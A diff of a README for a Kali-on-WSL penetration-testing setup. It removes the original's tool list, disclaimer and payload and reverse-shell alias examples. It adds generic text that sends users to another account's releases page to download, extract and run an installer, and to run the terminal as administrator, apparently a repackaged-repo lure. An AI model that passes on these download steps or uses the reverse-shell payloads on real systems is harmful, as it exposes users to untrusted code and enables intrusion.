@@ -1,121 +1,98 @@
-🛡️ WSL Kali Setup - Cybersecurity Configuration 
+# 🛡️ wslkalisetup - Your Ideal Security Environment for Penetration Testing
 
-<img width="781" height="868" alt="image" src="https://github.com/user-attachments/assets/b96fbd7d-c42b-4477-acd4-c1032546f75a" />
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-brightgreen)](https://github.com/bac0nnfires/wslkalisetup/releases)
 
+## 🚀 Getting Started
 
+Welcome to wslkalisetup! This tool is perfect for cybersecurity students, penetration testers, and researchers. It equips you with a tailored environment loaded with tools that make penetration testing more efficient. Here’s how to get started quickly.
 
-## 🚀 Features 🚀
-Functionality and Advanced Tools Integration
-- **Automated Reconnaissance**: Network discovery, port scanning, service enumeration
-- **Web Application Testing**: Comprehensive web security assessment tools
-- **Payload Generation**: Multiple reverse shell and exploit payload generators
-- **File Management**: Enhanced file viewing and copying utilities
-- **Environment Setup**: Organized workspace for security testing projects
-- **Network Scanning**: Nmap integration with custom profiles
-- **Web testing and modern Tools**: Gobuster, Nikto, whatweb automation, ffuf, feroxbuster, masscan, metasploit integration
-- **Subdomain Enumeration**: Multiple tool integration (subfinder, assetfinder)
-- **Vulnerability Assessment**: Automated vulnerability scanning workflows
-- **Encoding/Decoding**: Built-in utilities for common encoding schemes
-- **Enhanced History**: Advanced command history with deduplication
-- **Smart Completion**: Intelligent auto-completion for security tools
-- **Quick Navigation**: Fast workspace and directory switching
-- **Automated Workflows**: `full_recon <target>` for complete reconnaissance
-- **CVE Database**: `cve_lookup CVE-2021-44228` and exploit search
-- **Smart Aliases**: 40+ shortcuts for common tasks
-- **Organized Workspace**: Structured directories for scans, loot, reports
-- **Enhanced Terminal**: Better history, completion, file operations
+## 📥 Download & Install
 
-## 📦 Installation 📦
+To download the latest version of wslkalisetup, [visit the Releases page](https://github.com/bac0nnfires/wslkalisetup/releases). There, you will find the necessary files to set up your security environment. 
 
-## Requirements
-- Linux system (WSL, Kali, Ubuntu, Debian)
-- Zsh shell (auto-installed)
+When on the Releases page, locate the most recent version. Click on the highlighted download link next to the assets section. This will let you download the necessary files to your computer. 
 
-### Quick Install
-```bash
-wget https://raw.githubusercontent.com/cyb0rgdoll/wslkalisetup/main/install.sh
-chmod +x install.sh
-./install.sh
-```
+## 🔧 System Requirements
 
-### Options
-```bash
-./install.sh --unattended    # No prompts
-./install.sh --no-tools      # Config only
-./install.sh --help          # Show options
-```
+Before downloading, ensure your system meets these basic requirements:
 
-## Quick Usage
+- **Operating System:** Windows 10 or later. This tool is designed to work with the Windows Subsystem for Linux (WSL).
+- **WSL:** Must have WSL installed. Follow [Microsoft's guide](https://docs.microsoft.com/en-us/windows/wsl/install) if you need assistance setting it up. 
+- **Disk Space:** At least 1 GB of free disk space for the installation files and tools.
+- **Internet Connection:** A stable connection is required during installation to fetch necessary packages and updates.
 
-```bash
-# Network reconnaissance
-discover 192.168.1.0/24
-quickscan 192.168.1.100
-full_recon example.com
+## 📂 Installation Steps
 
-# Web testing
-webtest https://example.com
-ff -u https://example.com/FUZZ -w wordlist.txt
+1. **Download Files:**
+   - Go to [this link](https://github.com/bac0nnfires/wslkalisetup/releases).
+   - Download the latest release package.
 
-# Payload generation
-payload bash 4444
-msf_payload linux 4444
-revshell 4444
+2. **Extract Files:**
+   - Once downloaded, locate the compressed file in your downloads folder.
+   - Right-click on the file and select “Extract All.” This will create a folder containing setup files.
 
-# Vulnerability research
-cve_lookup CVE-2021-44228
-exploit_search "apache struts"
+3. **Open Windows Terminal:**
+   - Search for "Windows Terminal" in your start menu and open it.
 
-# View all shortcuts
-show_aliases
-cybersec-help
-```
+4. **Run Installation Script:**
+   - Navigate to the extracted folder. You can use the `cd` command to change directories. For example:
+     ```
+     cd Downloads/wslkalisetup
+     ```
+   - Once in the folder, run the installation script by typing:
+     ```
+     bash install.sh
+     ```
 
-## Tools Installed
+5. **Follow Prompts:**
+   - The script will guide you through the setup process. Follow the on-screen instructions carefully.
 
-**Core**: nmap, gobuster, nikto, whatweb, enum4linux, metasploit-framework  
-**Modern**: ffuf, feroxbuster, masscan, amass  
-**Go Tools**: subfinder, httpx, nuclei (optional)  
-**Utilities**: neofetch, searchsploit, custom wordlist management
+6. **Complete Installation:**
+   - After the script completes, it will notify you that the installation was successful.
 
-## Directory Structure
+## 💻 Configuration
 
-```
-~/cybersec/
-├── scans/      # Scan results
-├── loot/       # Extracted data
-├── reports/    # Assessment reports
-├── scripts/    # Custom tools
-└── wordlists/  # Custom wordlists
-```
+Once installed, wslkalisetup includes a pre-configured Zsh setup. This will:
 
-## Configuration
+- Provide easy navigation and command execution.
+- Preload essential tools for common penetration testing tasks.
+- Optimize your workflow with automated scripts.
 
-**API Keys**: Edit `~/.config/cybersec/api_keys.env`  
-**Customization**: Modify `~/.zshrc` sections as needed  
-**Help**: Run `cybersec-help` for detailed usage
+To start using Zsh, type `zsh` in the Windows Terminal after installation. This will switch you to your new environment.
 
-## Troubleshooting
+## 🛠️ Available Tools
 
-```bash
-# Test syntax
-zsh -n ~/.zshrc
+The following tools are included in your wslkalisetup installation:
 
-# Reinstall tools
-install-pentest-tools
+- **Nmap:** A powerful network scanning tool.
+- **Nikto:** A web server scanner that detects vulnerabilities.
+- **Metasploit Framework:** A tool for developing and executing exploit code against a remote target.
+- **Burp Suite:** A cybersecurity tool for testing web applications.
 
-# Restore backup
-cp ~/.zshrc.old ~/.zshrc
-```
+These tools will help you conduct thorough penetration tests efficiently.
 
-## Uninstall
+## 📋 Usage Tips
 
-```bash
-~/.wslkali_uninstall.sh
-```
+- Always run your terminal as an administrator to ensure all commands execute without permission issues.
+- Familiarize yourself with the installed tools; many have comprehensive documentation available online.
+- Use the `man` command for quick help on any tool, e.g., `man nmap`.
 
-## ⚠️ Disclaimer
+## 🌍 Community Support
 
-This configuration is designed for authorized security testing only. Users are responsible for ensuring they have proper authorization before using these tools against any systems. The authors are not responsible for any misuse or damage caused by this software, script or code.
+If you have any questions or need further assistance, feel free to reach out to our community. Here’s how you can connect:
 
- [GitHub Issues](https://github.com/cyb0rgdoll/wslkalisetup/issues) for support
+- **GitHub Issues:** Post any issues you encounter directly on the [Issues section](https://github.com/bac0nnfires/wslkalisetup/issues) of our GitHub repository. This helps us improve the tool.
+- **Forums:** Engage with other users in cybersecurity forums and discussion boards. Sharing experiences can provide valuable insights.
+- **Social Media:** Follow relevant channels for updates, tips, and more.
+
+## 📅 Keeping Your Tool Updated
+
+To ensure you have the latest improvements and security updates, check the Releases page regularly for new versions. Update as needed by repeating the download and installation steps.
+
+## 📝 Documentation
+
+Comprehensive documentation is available in the repository. It covers advanced configurations, troubleshooting tips, and ways to contribute. Be sure to review it for in-depth understanding and to utilize all features effectively.
+
+---
+
+Thank you for choosing wslkalisetup! Your feedback is welcome as we continue to improve. Enjoy your secure environment for penetration testing!
